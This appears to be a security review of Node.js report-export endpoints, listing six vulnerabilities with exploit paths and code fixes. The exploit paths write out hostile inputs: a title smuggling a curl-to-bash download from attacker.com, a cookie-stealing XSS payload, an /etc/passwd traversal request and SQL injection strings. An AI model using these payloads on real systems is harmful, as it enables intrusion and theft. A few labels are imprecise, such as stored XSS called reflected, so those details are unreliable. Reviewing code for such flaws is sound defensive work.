# Security Review: File Export Endpoints

**Verdict: FIX FIRST**

---

## Finding 1 — SQL Injection (Critical)

- **Location:** `routes/export.js:17`
- **Vulnerability:** The `id` parameter from `req.params` is interpolated directly into the SQL query string with no parameterization:
  ```js
  db.query(`SELECT * FROM reports WHERE id = ${id}`)
  ```
- **Severity:** Critical
- **Exploit path:** An authenticated user sends `POST /reports/1%27%20OR%20TRUE%20--/export` (or any crafted `id` value). The resulting query becomes `SELECT * FROM reports WHERE id = 1' OR TRUE --`, which returns all rows. The attacker can then use UNION-based injection to extract data from other tables (e.g., `users`, `sessions`), or even write to the filesystem if the database user has elevated privileges.
- **Fix:** Parameterize the query, same pattern already used correctly on line 40:
  ```js
  const r = await db.query('SELECT * FROM reports WHERE id = $1', [id]);
  ```

---

## Finding 2 — Command Injection via `pandoc` (Critical)

- **Location:** `routes/export.js:26`
- **Vulnerability:** The `PANDOC_TOKEN` value is concatenated directly into a shell command string via `execSync`. While the token itself is a hardcoded constant, the `outPath` variable (derived from `report.title` on line 21) is also passed into the shell command without sanitization:
  ```js
  execSync(`pandoc /tmp/in.md -o "${outPath}" --token ${PANDOC_TOKEN}`);
  ```
  If `report.title` contains shell metacharacters (e.g., `; rm -rf /`), the attacker controls the command through the report title. An attacker who can create or edit a report with a malicious title can achieve arbitrary command execution on the server.
- **Severity:** Critical
- **Exploit path:**
  1. Attacker creates or edits a report with title `foo; curl attacker.com/shell.sh|bash; #`
  2. When the export endpoint is triggered, `outPath` becomes `/var/app/exports/foo; curl attacker.com/shell.sh|bash; #.pdf`
  3. The shell command becomes: `pandoc /tmp/in.md -o "/var/app/exports/foo; curl attacker.com/shell.sh|bash; #.pdf" --token pk_live_...`
  4. The shell interprets the `;` and `|` operators, executing arbitrary commands.
- **Fix:** Use `execFileSync` (or `spawn`) with an argument array instead of `execSync` with a string, and validate/sanitize `report.title` before using it in any filesystem path. Example:
  ```js
  const safeName = path.basename(outName); // strip any path traversal
  const safePath = path.join(EXPORT_DIR, safeName);
  execFileSync('pandoc', ['/tmp/in.md', '-o', safePath, '--token', PANDOC_TOKEN]);
  ```

---

## Finding 3 — Path Traversal in Download Endpoint (High)

- **Location:** `routes/export.js:34`
- **Vulnerability:** The `name` query parameter is joined directly to the export directory without any validation:
  ```js
  const full = path.join(EXPORT_DIR, name);
  res.sendFile(full);
  ```
  An attacker can use `../` sequences to read arbitrary files on the filesystem.
- **Severity:** High
- **Exploit path:** An authenticated user requests `GET /download?name=../../../etc/passwd`. The resolved path becomes `/var/app/exports/../../../etc/passwd` which resolves to `/etc/passwd`. The server sends the file contents back. This can be extended to read source code, environment files, SSH keys, or any file the Node process can read.
- **Fix:** Validate that the resolved path is within the export directory:
  ```js
  const full = path.resolve(path.join(EXPORT_DIR, name));
  if (!full.startsWith(path.resolve(EXPORT_DIR))) {
    return res.status(403).send('forbidden');
  }
  res.sendFile(full);
  ```

---

## Finding 4 — Reflected XSS in Preview Endpoint (High)

- **Location:** `routes/export.js:42`
- **Vulnerability:** The `report.body` is inserted directly into an HTML response with no escaping or Content-Security-Policy header:
  ```js
  res.send(`<div class="report">${r.rows[0].body}</div>`);
  ```
  The `reports.body` column is user-controlled (stored markdown content). If an attacker can inject HTML/JavaScript into a report body (via report creation or by compromising another user's report), that payload executes in any viewer's browser.
- **Severity:** High
- **Exploit path:**
  1. Attacker creates a report with body `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`
  2. When an admin or other user visits `GET /reports/:id/preview`, the script executes in their browser context.
  3. The attacker captures session cookies, performs actions as the victim user, or exfiltrates sensitive data.
- **Fix:** Escape the body content before embedding in HTML (e.g., using `escape-html` or a template engine with auto-escaping), and set `Content-Type: text/plain` if raw HTML is not intended. If HTML rendering is required, use a sanitization library like DOMPurify on the server side.

---

## Finding 5 — Client-Side Admin Gate (Low)

- **Location:** `client/report.js:2`
- **Vulnerability:** The admin-only preview button is hidden based on `currentUser.role` in client-side JavaScript:
  ```js
  if (currentUser.role !== 'admin') { hidePreviewButton(); }
  ```
  This is purely cosmetic. The server-side `/reports/:id/preview` endpoint has no role check at all. Any authenticated user can access the preview endpoint regardless of role.
- **Severity:** Low
- **Exploit path:** Any authenticated non-admin user can directly call `GET /reports/:id/preview` to read any report's raw body. The client-side gate provides no real protection.
- **Fix:** Add a role check on the server side in the preview route handler:
  ```js
  if (req.user.role !== 'admin') {
    return res.status(403).send('forbidden');
  }
  ```

---

## Finding 6 — Hardcoded Secret (Medium)

- **Location:** `routes/export.js:19`
- **Vulnerability:** The Pandoc license key (`PANDOC_TOKEN`) is hardcoded as a string literal in source code:
  ```js
  const PANDOC_TOKEN = 'pk_live_8f3a1c9d2b4e6f70';
  ```
  This secret will be committed to version control, visible in any code review, and potentially leaked through logs, error messages, or a repo breach.
- **Severity:** Medium
- **Exploit path:** An attacker with read access to the source code (e.g., a compromised GitHub repo, a former employee, or a dependency supply-chain attack) obtains the live Pandoc token and uses it to consume the organization's Pandoc cloud quota or access associated services.
- **Fix:** Store the token in an environment variable or secrets manager:
  ```js
  const PANDOC_TOKEN = process.env.PANDOC_TOKEN;
  ```

---

## Summary

| # | Finding | Severity |
|---|---------|----------|
| 1 | SQL Injection in export query | Critical |
| 2 | Command Injection via pandoc | Critical |
| 3 | Path Traversal in download | High |
| 4 | Reflected XSS in preview | High |
| 5 | Missing server-side admin check | Low |
| 6 | Hardcoded API token | Medium |

**Verdict: FIX FIRST.** Two critical vulnerabilities (SQL injection and command injection) allow full server compromise. The path traversal and XSS findings also pose significant data exposure risk. These should be fixed before any merge.